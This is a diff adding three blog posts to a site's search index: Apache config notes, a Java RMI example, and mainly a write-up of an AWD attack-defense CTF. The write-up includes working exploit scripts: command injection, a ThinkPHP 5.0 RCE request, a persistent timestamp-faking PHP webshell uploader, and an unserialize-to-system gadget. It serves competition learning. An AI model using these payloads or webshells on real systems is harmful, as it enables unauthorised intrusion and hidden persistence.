@@ -4,6 +4,83 @@
   
     
     <entry>
+      <title>apache配置文件简单记录</title>
+      <link href="/posts/a3f2ee6b/"/>
+      <url>/posts/a3f2ee6b/</url>
+      
+        <content type="html"><![CDATA[<p>一直不太清楚apache的配置文件，简单记录一下</p><p><code>/etc/apache2</code> 下的文件</p><p><code>apache2.conf</code> 是主配置文件，之后的 <code>available</code> 代表可用的, <code>enable</code> 代表已经启用的</p><p><img src="/posts/a3f2ee6b/1584192313504.png" alt></p><p><code>sites-enabled</code> 下</p><p><img src="/posts/a3f2ee6b/1584192394696.png" alt></p><p>000-default.conf 文件规定了网站根目录</p><pre><code>&lt;VirtualHost *:80&gt;        # The ServerName directive sets the request scheme, hostname and port that        # the server uses to identify itself. This is used when creating        # redirection URLs. In the context of virtual hosts, the ServerName        # specifies what hostname must appear in the request&#39;s Host: header to        # match this virtual host. For the default virtual host (this file) this        # value is not decisive as it is used as a last resort host regardless.        # However, you must set it for any further virtual host explicitly.        #ServerName www.example.com        ServerAdmin webmaster@localhost        DocumentRoot /var/www/html        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,        # error, crit, alert, emerg.        # It is also possible to configure the loglevel for particular        # modules, e.g.        #LogLevel info ssl:warn        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined        # For most configuration files from conf-available/, which are        # enabled or disabled at a global level, it is possible to        # include a line for only one particular virtual host. For example the        # following line enables the CGI configuration for this host only        # after it has been globally disabled with &quot;a2disconf&quot;.        #Include conf-available/serve-cgi-bin.conf&lt;/VirtualHost&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noet</code></pre><p><code>/etc/apache2/mods-enabled /mime.conf</code> 中配置了可以解析的文件类型</p><p><img src="/posts/a3f2ee6b/1584192584702.png" alt></p><p>这样就能解析 php5 等的后缀了</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> apache </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>星盟3月AWD比赛</title>
+      <link href="/posts/f1d265cd/"/>
+      <url>/posts/f1d265cd/</url>
+      
+        <content type="html"><![CDATA[<p>又双叒叕的打了一次AWD比赛，简单地总结一下</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><h3 id="直接读flag"><a href="#直接读flag" class="headerlink" title="直接读flag"></a>直接读flag</h3><p>最开始放了web2，ssh连上去，d盾没扫出什么东西</p><p>然后开始一个个看(现在都流行不放shell，直接给flag的2333)</p><p><img src="/posts/f1d265cd/1584182423201.png" alt></p><p>丢给群里的其他师傅开始写批量</p><pre><code class="python">import requestsimport report = [20180,20280,20380,20480,20580,20680,20780,20880,20980,21080,21180,21280,21380,21480,21580,21680,21780,21880,21980,22080,22180,22280,22380,22480]url = &#39;http://ip:{port}/login.php&#39;for i in port:    r = requests.get(url=url.format(port=str(i)))    if r.status_code == 200:        try:            print(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])        except IndexError:            pass</code></pre><p>批量交flag(后来发现平台有设置csrf token。导致无法批量交。)</p><pre><code class="python">send_url = &#39;http://ip:8001/api/v1/challenges/attempt&#39;cookie = {&#39;Cookie&#39;: &#39;session=be71fde5-8749-46b2-8ac6-fb30b0ec93bb; PHPSESSID=pdq189at1p9g6478tmt8urkng2&#39;}for flag in submit_flag:    data = {&quot;challenge_id&quot;:2,&quot;submission&quot;:flag}    requests.post(url=send_url,data=data,cookies=cookie)</code></pre><p>最后合并为十分钟交一次</p><pre><code class="python">import requestsimport refrom time import sleepwhile True:    port = [20180,20280,20380,20480,20580,20680,20780,20880,20980,21080,21180,21280,21380,21480,21580,21680,21780,21880,21980,22080,22180,22280,22380,22480]    url = &#39;http://ip:{port}/login.php&#39;    submit_flag = []    for i in port:        r = requests.get(url=url.format(port=str(i)))        if r.status_code == 200:            try:                submit_flag.append(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])            except IndexError:                pass    send_url = &#39;http://ip:8001/api/v1/challenges/attempt&#39;    cookie = {&#39;Cookie&#39;: &#39;session=be71fde5-8749-46b2-8ac6-fb30b0ec93bb; PHPSESSID=pdq189at1p9g6478tmt8urkng2&#39;}    for flag in submit_flag:        data = {&quot;challenge_id&quot;:2,&quot;submission&quot;:flag}        req = requests.post(url=send_url,data=data,cookies=cookie)        if &#39;incorrect&#39; not in req.text:            print(&#39;提交正确&#39;)    sleep(600)</code></pre><p>ps.赛后师傅说并没有换cookie，用下面的代码就能批量交。</p><p><img src="/posts/f1d265cd/1584186516112.png" alt></p><h3 id="后台任意文件上传"><a href="#后台任意文件上传" class="headerlink" title="后台任意文件上传"></a>后台任意文件上传</h3><p>看到 <code>test.sql</code> 中是有用户名和密码的，登录之后有上传点</p><p>黑名单只有这几个。。而且htaccess还写错了，php5,php7,phtml也都没有过滤，不过上传之后还是会重命名，算是也过滤了 <code>.htaccess</code> </p><pre><code>$black_list = [&quot;ini&quot;,&quot;htacces&quot;,&quot;php&quot;,&quot;ph3&quot;,&quot;html&quot;];$ext=pathinfo($name)[&#39;extension&#39;];$ext =strtolower($ext);</code></pre><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><h3 id="md文件解析漏洞"><a href="#md文件解析漏洞" class="headerlink" title="md文件解析漏洞"></a>md文件解析漏洞</h3><p>这个web套路好深2333</p><p>d盾可以扫到一个shell，但是是在markdown文件中，还有一个是库中的回调函数</p><p><img src="/posts/f1d265cd/1584182744449.png" alt></p><p>最开始以为是d盾误报，结果后来看了一眼 <code>.htaccess</code></p><pre><code>AddType application/x-httpd-php .html .md</code></pre><p>居然将markdown文件解析为php….这个思路挺强的</p><p>但是由于发现的比较晚，貌似都修好了</p><h3 id="ping命令执行"><a href="#ping命令执行" class="headerlink" title="ping命令执行"></a>ping命令执行</h3><pre><code class="php">function waf($str){    $str=str_replace(&#39; &#39;,&#39;&#39;,$str);    $str=str_replace(&#39;;&#39;,&#39;&#39;,$str);    $str=str_replace(&#39;|&#39;,&#39;&#39;,$str);    return $str;}function ping($host){    $host=waf($host);    var_dump($host);    system(&quot;ping -c 1 $host&quot;);}if(isset($_REQUEST[1]))    ping($_REQUEST[1]);</code></pre><p>这个命令执行倒是挺简单的， <code>&amp;cat&lt;/flag</code> 即可</p><pre><code class="python">import requestsimport report = [30180,30280,30680,30780,30980,31180,31280,31380,31480,31580,31780,31880,31980,32080,32180,32280,32380,32480,31080,30580,30380,30480,30880,31680]url = &#39;http://ip:{port}/common/function.php?1=&amp;cat&lt;/flag&#39;for i in port:    r = requests.get(url=url.format(port=str(i)))    try:        print(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])    except IndexError:        pass</code></pre><h3 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h3><p>审计源码发现 <code>admin, admin</code>  即可登陆</p><p>然后有文件上传点，直接传shell.md即可解析</p><p>事后写了一个批量上传不死马的脚本</p><pre><code class="python">import requestsimport hashlibbs_webshell = &quot;&quot;&quot;&lt;?php    ignore_user_abort(true);    set_time_limit(0);    unlink(__FILE__);    $file = &#39;%s&#39;;    $code = &#39;&lt;?php if($_POST[&quot;pass&quot;]==&quot;%s&quot;){@eval($_POST[1]);}?&gt;&#39;;    while (1) {        file_put_contents($file, $code);        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; %s&#39;);        usleep(50);    }?&gt;&quot;&quot;&quot;secret = &quot;pxy&quot;shell_path = &quot;.pxy.php&quot;def md5_hash(s):    return hashlib.md5(s.encode()).hexdigest()def generateShell(ip):    pwd = md5_hash(secret + ip)    shell = bs_webshell % (shell_path, pwd, shell_path)    print(shell)    return shelldef checkShell(ip,shell_path):    url = &#39;http://%s/%s&#39; % (ip, shell_path)    try:        res = requests.get(url, timeout=3)    except:        pass    pwd = md5_hash(secret + ip)    res = requests.post(url, data={&#39;pass&#39;: pwd, &#39;1&#39;: &#39;echo(123);&#39;})    print(res.text)    if res.text == &#39;123&#39;:        print(&#39;[+]&#39;+ip,&#39;Check OK&#39;)ports = [30180,30280,30380,30480,30580,30680,30780,30880,30980,31080,31180,31280,31380,31480,31580,31680,31780,31880,31980,33080,32180,32280,32380,32480]ip = &quot;127.0.0.1&quot;for i in ports:    files = {&quot;pic&quot;:(&#39;shell.md&#39;, generateShell(ip), &#39;application/octet-stream&#39;)}    cookies = dict(PHPSESSID=&#39;fjue55il5q0v90fp8l66us6hq0&#39;)    url = &quot;http://&quot;+ip+&quot;:&quot;+str(i)    url_upload = url+&quot;/index.php?c=User&amp;a=upload&quot;    r = requests.post(url=url_upload,files=files, cookies=cookies)    if b&quot;successfully&quot; in r.content:        print(&quot;[+]&quot;+ip+&quot;:&quot;+str(i)+&quot; upload success&quot;)    url_1 = url + &quot;/upload/admin_shell.md&quot;    try:        r = requests.get(url_1,timeout=2)    except requests.exceptions.ReadTimeout:        checkShell(ip, &quot;upload/.pxy.php&quot;)</code></pre><p>后来研究发现，其实文件上传不仅仅是</p><pre><code>/index.php?c=User&amp;a=upload</code></pre><p>也可以</p><pre><code>/index.php?c=File&amp;a=save</code></pre><p>因为 <code>index.php</code> 是这样写的</p><pre><code class="php">$c=isset($_GET[&#39;c&#39;])?$_GET[&#39;c&#39;]:&#39;User&#39;;$a=isset($_GET[&#39;a&#39;])?$_GET[&#39;a&#39;]:&#39;Index&#39;;$obj=run_c($c);run_a($obj,$a);</code></pre><p>URL格式为：</p><pre><code>http://localhost/index.php?c=User&amp;a=home</code></pre><p>就是可以调用任意类的任意方法</p><p>ps比赛的时候我们是这么想的：</p><p>看到 <code>base.php</code> 中实例化了 <code>Smarty</code> </p><p><img src="/posts/f1d265cd/1584186763035.png" alt></p><p>之后看到这里有一处eval。</p><p><img src="/posts/f1d265cd/1584186784920.png" alt></p><p>于是就开始想能不能getshell，但是无果。</p><h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><p>感谢a2u13师傅</p><p>还是接前面的分析，可以执行任意类的任意方法。但是那个地方是字符串拼接！。</p><p>所以可以直接通过 <code>;</code> 进行命令注入</p><p><img src="/posts/f1d265cd/1584188249191.png" alt></p><p>File类需要登陆才能使用，换一个 <code>User</code>类就行</p><p><img src="/posts/f1d265cd/1584188382658.png" alt></p><p>比赛的时候确实没往这块想，还是要加强代码审计啊</p><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><pre><code class="php">&lt;?phpclass home{    public $method;    public $args;    function __construct($method, $args) {        $this-&gt;method = $method;        $this-&gt;args = $args;    }    function __destruct(){        var_dump($this-&gt;method);        ($this-&gt;method)($this-&gt;args);    } }     $a=$_REQUEST[&#39;a&#39;];    @unserialize($a);     ?&gt;</code></pre><p>看上去挺像反序列化的，但是</p><pre><code>($this-&gt;method)($this-&gt;args);</code></pre><p>这里是报错的，所以比赛的时候没法利用</p><p>复盘的时候才意识到原来只有php7才可以这么用</p><p>经过测试发现只能直接动态调用system函数，eval和assert都是不行的</p><p><img src="/posts/f1d265cd/1584191203655.png" alt></p><p><img src="/posts/f1d265cd/1584191226590.png" alt="eval是不行的"></p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>web1是最后放出来的，为了提高挑战性不给ssh密码。</p><p>但是稍微看两眼就会发现是tp5.0写的，还开了debug，于是直接RCE了</p><pre><code class="python">import requestsimport report = [10180,10280,10380,10480,10580,10680,10780,10880,10980,11080,11180,11280,11380,11480,11580,11680,11780,11880,11980,12080,12180,12280,12380,12480]url_flag = &#39;http://ip:{port}/public/index.php?s=captcha&#39;data = {&#39;_method&#39;:&#39;__construct&#39;,        &#39;filter[]&#39;:&#39;system&#39;,        &#39;method&#39;:&#39;get&#39;,&#39;get[]&#39;:&#39;cat /flag&#39;}for i in port:    r = requests.post(url=url_flag.format(port=str(i)),data=data)    if r.status_code == 200:        try:            print((re.findall(r&quot;(flag{.*})&quot;,r.text)[0]))        except IndexError:            pass</code></pre><p>这一波flag还是挺舒服的，但是遗憾的是没法修啊。。</p><p><img src="/posts/f1d265cd/1584183311879.png" alt></p><p>不过后来意识到可以直接将 <code>/var/www/html</code> 下的文件打包下载，还可以自己往里面写shell然后蚁剑连接进行修改。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> AWD </tag>
+            
+            <tag> 总结 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>jndi注入</title>
+      <link href="/posts/aba5931d/"/>
+      <url>/posts/aba5931d/</url>
+      
+        <content type="html"><![CDATA[<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>Hello接口</p><pre><code class="java">import java.rmi.Remote;import java.rmi.RemoteException;public interface Hello extends Remote{    public String hello() throws RemoteException;}</code></pre><p>对应的实现</p><pre><code class="java">import java.io.Serializable;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;/** * @description: Hello实现 * @author: Pxy * @create: 2020-03-12 22:15 **/public class RemoteHello extends UnicastRemoteObject implements Hello{    protected RemoteHello() throws RemoteException {        super();    }    public String  hello() throws RemoteException {        return &quot;hello&quot;;    }}</code></pre><p>创建一个服务端</p><pre><code class="java">import java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.server.UnicastRemoteObject;/** * @description: RMI服务器 * @author: Pxy * @create: 2020-01-20 08:45 **/public class RMIServer {    public void start() throws Exception{        RemoteHello h = new RemoteHello();        LocateRegistry.createRegistry(1099);        Naming.bind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h);    }    public static void main(String[] args) throws Exception {        RMIServer rmiServer = new RMIServer();        rmiServer.start();    }}</code></pre><p>客户端进行访问</p><pre><code class="java">import java.rmi.Naming;/** * @description: RMI客户端 * @author: Pxy * @create: 2020-01-20 08:57 **/public class TrainMain {    public static void main(String[] args) throws Exception {        Hello hello = (Hello) Naming.lookup(&quot;rmi://127.0.0.1/Hello&quot;);        System.out.println(hello.hello());    }}</code></pre><p>这样就能实现RMI</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> jndi </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>汇编从入门到入土五</title>
       <link href="/posts/7fad3d80/"/>
       <url>/posts/7fad3d80/</url>
@@ -308,9 +385,9 @@
       
         <tags>
             
-            <tag> 反序列化 </tag>
-            
             <tag> pickle </tag>
+            
+            <tag> 反序列化 </tag>
             
         </tags>
       
@@ -1260,9 +1337,9 @@
       
         <tags>
             
-            <tag> java </tag>
-            
             <tag> 反序列化 </tag>
+            
+            <tag> java </tag>
             
         </tags>
       
